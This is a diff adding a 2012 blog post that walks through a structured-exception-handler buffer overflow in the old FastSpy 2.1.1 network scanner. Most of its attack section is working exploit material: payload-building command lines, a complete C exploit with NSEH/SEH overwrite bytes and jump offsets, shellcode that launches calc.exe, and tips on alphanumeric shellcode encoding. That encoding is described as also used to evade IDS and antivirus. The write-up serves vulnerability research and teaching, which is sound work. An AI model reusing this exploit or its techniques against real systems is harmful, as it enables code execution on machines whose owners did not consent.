@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>FastSpy 2.1.1 Buffer Overflow</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+
+	<div style="float: right;"></div><br>
+	<p>
+	<nav>
+			<a href="/"><b>post</b></a>.
+			
+			
+			<a href="/other/"><b>other</b></a>.
+			
+			<a href="/about/"><b>about</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>FastSpy 2.1.1 Buffer Overflow</h1>
+			<b><time>2012-10-03</time></b>
+		       
+
+			<div>
+				<p><a href="http://sourceforge.net/projects/fastspy/">FastSpy</a> is an oooooooooooooooooooold multithreaded network scanner, circa 1999, that doesn&rsquo;t really see any use nowadays.  I started using <a href="http://koders.com/">Koders</a> to dig around projects and find potential exploits, and ran across this one.  It&rsquo;s drop-dead simple in practice (deceptively so), and there were a few interesting parts to it so I figured I&rsquo;d throw this up.  At the time of writing, I don&rsquo;t think the original developer is even around, and I haven&rsquo;t seen this posted anywhere else.</p>
+<p>While parsing through code for strcpy&rsquo;s, I discovered FastSpy parsing input files with the following:</p>
+<pre tabindex="0"><code>case &#39;i&#39;:
+    InputFromFile = TRUE;
+    strcpy(InputFileName, optarg);
+    break;
+</code></pre><p>Where InputFileName is a 128 byte character buffer.  This vulnerability exists with a couple flags used by FastSpy, though it appears they actually read the data in correctly.</p>
+<p>I wanted this to be a Windows PoC, so I loaded up PowerShell (who knew, right) and tried it out:</p>
+<pre tabindex="0"><code>.\ImmunityDebugger.exe ./fs.exe $(python -c &#34;print &#39;-i &#39; + &#39;\x90&#39;*1120&#34;)
+</code></pre><p>I should note there&rsquo;s a bit of cheating here, because I had already done this and figured out the values for overwriting the NSEH/SEH.  The above will launch Immunity with the FastSpy executable and the passed arguments.  That address will bring us right up to the NSEH.</p>
+<p>One interesting bit here is that we&rsquo;re overflowing a filename and we&rsquo;re using Python.  As of writing, os.system() does not allow us to pass addresses as arguments to applications without getting UTF encoded. Because of this, my &lsquo;\x90&rsquo; in the above line will not properly encode.  Instead, we need to do a little magic; <a href="http://www.blackhatlibrary.net/Ascii_shellcode">here</a> is a great source for finding alphanumeric equivalents.  Typically you&rsquo;d use this thing for obfuscating shellcode to evade IPS/IDS/AV&rsquo;s, but in our case it&rsquo;s different.  I opted for &lsquo;\x50\x58&rsquo;, which is a POP then a PUSH, so an equivalent two-instruction NOP.</p>
+<p>As per the typical SEH exploit, I needed a POP POP RET.  From there, I needed a JMP back into shellcode.  Unfortunately, the JMP opcode, \xeb, isn&rsquo;t going to work because its not available in the alphanumeric set.  Instead we&rsquo;ll use a JE, \x74, to give us enough room to hop back into a bigger jump.  Our command now looks like this:</p>
+<pre tabindex="0"><code>.\ImmunityDebugger.exe ./fs.exe $(python -c &#34;print &#39;-i &#39; + &#39;\x50\x58&#39;*558 + &#39;\x41\x42\x43\x44&#39; + &#39;\x74\x80\x50\x58&#39; + &#39;\x65\x10\x40\x00&#39; + &#39;D&#39;*200&#34;)
+</code></pre><p>Couple of things to note; we&rsquo;ve halved our NOP count because each NOP is now two instructions.  I&rsquo;ve added the ABCD ASCII values to show where our JE will hop into, the JE instruction, and finally my chosen POP POP RET address.  Here&rsquo;s a shot of the debugger at the JE instruction:</p>
+<p>{{ img /images/posts/2012/jump_back.jpg }}</p>
+<p>You can see the four letters as instructions just above our JE instruction (<code>\x41\x42\x43\x44</code>).  Conditional jumps are restricted to +/- 127, which is why we&rsquo;ve got \x80 loaded up.  With this, you can see our NOP sled full of bytes waiting for your shell.  The shellcode needs to be alphanumeric, so I had to run it through msfencode -e x86/mixed_alpha or using Skypher&rsquo;s <a href="http://code.google.com/p/alpha3/">ALPHA3</a>.</p>
+<p>In actuality, it was a huge pain to get this to work properly in the environment that I was developing in, but I was curious nonetheless if it was possible.  At this point I decided to switch to C so I could hack it out.  Copying over most of the work I&rsquo;d already done, I got this:</p>
+<pre tabindex="0"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+
+// Exploit Title: FastSpy v2.1.1 Buffer Overflow
+// Date: 10/03/12
+// Exploit Author: drone
+// Software Link: https://sourceforge.net/projects/fastspy/
+// Version: 2.1.1
+// Tested on: Windows XP SP3
+
+//
+// compiled with MS x86 C/C++ compiler v16.00.
+// Run in the folder with the FastSpy executable
+//
+int main (int argc, char **argv)
+{
+    char command[2000];
+    char *buf = (char *)malloc(1141);
+    char *nseh = &#34;\xeb\xd9\x90\x90&#34;;
+    char *seh = &#34;\x65\x10\x40\x00&#34;;
+    char *njmp = &#34;\xe9\xa4\xfb\xff\xff&#34;;
+    // calc.exe
+    char shellcode[] = &#34;\x31\xC9\x51\x68\x63\x61\x6C\x63\x54\xB8\xC7\x93\xC2\x77\xFF\xD0&#34;;
+
+    int i;
+    for ( i = 0; i &lt; 1120; ++i ) {
+        buf[i] = 0x41;
+    }
+
+    memcpy ( buf+20, shellcode, strlen(shellcode));
+    memcpy ( buf+1115, njmp, 5);
+    memcpy ( buf+1120, nseh, sizeof(nseh));
+    memcpy ( buf+1120+sizeof(nseh), seh, sizeof(seh));
+    
+    sprintf(command, &#34;\&#34;\&#34;fs.exe\&#34; -i %s\&#34;\&#34;&#34;, buf);
+
+    printf(&#34;[+] Launching FastSpy...\n&#34;);
+    
+    system(command);
+
+    printf(&#34;[+] Exploit done&#34;);
+    return 0;
+}
+</code></pre><p>Just a few things to note on this; calculating near jump.  Once we&rsquo;ve got the short jump back into controlled space, we need a near jump to further ourselves to the top of shellcode space.  This can be done with the \xe9 opcode.  To calculate the exact distance, we need to subtract the origin address from the destination address.  This can be done with gdb:</p>
+<pre tabindex="0"><code>p 0x0018ff73 - 0x0018fb17
+$3 = 1116
+</code></pre><p>Now that we&rsquo;ve got the distance, we need the number in hexadecimal.  This can be calculated by taking the negative of the number and converting it to hex:</p>
+<pre tabindex="0"><code>p/x -1116
+$4 = 0xfffffba4
+</code></pre><p>So now we know that our near jump is going to be <code>\xe9\xa4\xfb\xff\xff</code>.</p>
+<p>Otherwise the vulnerability is a straight-forward SEH exploit.  I was particularly interested in getting the alphanumeric shell to work, though.</p>
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/blog/the-fanciful-allure-and-utility-of-syscalls/">the fanciful allure and utility of syscalls</a></li>
+				
+				<li><a href="/blog/on-exploiting-cve-2021-1648-splwow64-lpe/">On Exploiting CVE-2021-1648 (splwow64 LPE)</a></li>
+				
+				<li><a href="/blog/digging-the-adobe-sandbox-ipc-internals/">Digging the Adobe Sandbox - IPC Internals</a></li>
+				
+				<li><a href="/blog/exploiting-leaked-process-and-thread-handles/">Exploiting Leaked Process and Thread Handles</a></li>
+				
+				<li><a href="/blog/code-execution-via-fiber-local-storage/">Code Execution via Fiber Local Storage</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2024 <a href="https://dronesec.pw/"><b>Bryan Alexander</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
